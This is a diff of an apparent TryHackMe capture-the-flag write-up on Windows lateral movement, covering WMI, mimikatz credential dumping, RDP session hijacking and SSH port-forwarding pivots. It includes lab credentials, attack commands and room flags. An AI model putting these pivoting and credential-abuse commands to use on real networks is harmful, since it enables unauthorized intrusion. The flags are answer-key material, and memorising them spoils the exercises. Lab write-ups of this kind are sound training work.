@@ -158,8 +158,6 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Insta
 C:\Users\t1_corine.waters\Desktop>Flag.exe
 Flag.exe
 THM{MOVING_WITH_WMI_4_FUN}
-
-
 ```
 
 ## Task 5  Use of Alternate Authentication Material
@@ -205,8 +203,6 @@ User : Guest
 RID  : 000001f7 (503)
 User : DefaultAccount 
 
-
-
 mimikatz # sekurlsa::msv              
 [....More Stuff....]   
 
@@ -237,9 +233,11 @@ THM{NO_PASSWORD_NEEDED}
 ## Task 6  Abusing User Behaviour
 + What flag did you get from hijacking t1_toby.beck's session on THMJMP2?`THM{NICE_WALLPAPER}`
 
-t2_eric.harding:Kegq4384
++ New Credential `t2_eric.harding:Kegq4384`
+
 ```bash
-xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_eric.harding /p:Kegq4384
+┌──(kali㉿kali)-[~/TryHackMe]
+└─$ xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_eric.harding /p:Kegq4384
 
 
 C:\Windows\system32>query user
@@ -263,15 +261,16 @@ THM{NICE_WALLPAPER}
 + What is the flag obtained from executing "flag.exe" on t1_thomas.moore's desktop on THMIIS?`THM{SIGHT_BEYOND_SIGHT}`
 + What is the flag obtained using the Rejetto HFS exploit on THMDC? `THM{FORWARDING_IT_ALL}`
 
++ New Credential `jasmine.stanley:G0O6Zd5aM`
 ```bash
-jasmine.stanley:G0O6Zd5aM
+C:\> ssh tunneluser@10.50.49.50 -R 3389:10.200.51.101:3389 -N
 
-ssh tunneluser@10.50.49.50 -R 3389:10.200.51.101:3389 -N
-xfreerdp /v:127.0.0.1 /u:t1_thomas.moore /p:MyPazzw3rd2020
+┌──(kali㉿kali)-[~/TryHackMe]
+└─$ xfreerdp /v:127.0.0.1 /u:t1_thomas.moore /p:MyPazzw3rd2020
 THM{SIGHT_BEYOND_SIGHT}
 
 
-ssh tunneluser@10.50.49.50 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
+C:\> ssh tunneluser@10.50.49.50 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
 
 
 C:\hfs>type flag.txt
